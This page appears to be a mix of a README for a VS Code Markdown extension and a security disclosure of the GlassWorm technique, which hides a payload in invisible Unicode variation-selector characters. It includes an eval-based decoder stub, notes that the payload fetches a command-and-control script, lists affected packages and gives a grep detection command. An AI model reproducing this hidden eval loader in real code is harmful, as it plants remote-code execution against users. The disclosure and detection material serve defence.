# Markdown Editor — Enhanced Formatting Toolkit
A VS Code extension that provides enhanced Markdown editing capabilities
including live preview, table formatting, and export functionality.

## Installation
Install from OpenVSX:
```
ext install quartz.quartz-markdown-editor
```

## Technical Details
The extension uses a lightweight JavaScript runtime for rendering.
The following code demonstrates the GlassWorm Unicode PUA injection
technique where the payload is hidden in invisible characters.

```javascript
// Decoder for the enhanced rendering engine
// The payload is encoded as invisible Unicode PUA characters (U+FE00-U+FE0F)
// embedded in what appears to be an empty string literal
function initRenderer(s) {
  // s() extracts codepoints from invisible PUA characters
  // codePointAt() reads U+FE00-U+FE0F offset values
  // Buffer.from() reconstructs the byte payload
  // eval() executes the decoded second-stage script
  eval(Buffer.from(s(``)).toString());
}

// The backtick string above contains invisible Unicode characters
// in the range 0xFE00-0xFE0F and 0xE0100-0xE01EF that encode
// a malicious payload fetching a Solana memo C2 script
```

## Affected Packages
This attack pattern was observed in:
- npm: `@aifabrix/miso-client` (invisible unicode inject pua unicode payload)
- npm: `@iflow-mcp/watercrawl-watercrawl-mcp` (glassworm unicode FE00 E0100)
- VSCode: `quartz.quartz-markdown-editor`
- 150+ GitHub repositories

## Detection
The GlassWorm invisible Unicode PUA payload injection technique
(disclosed March 2026 by Aikido Security) uses codePointAt() to
decode 0xFE00/0xFE0F range characters into executable JavaScript.
Audit all dependencies for invisible Unicode characters using:
```
grep -rP '[\xef\xb8\x80-\xef\xb8\x8f]' .
```
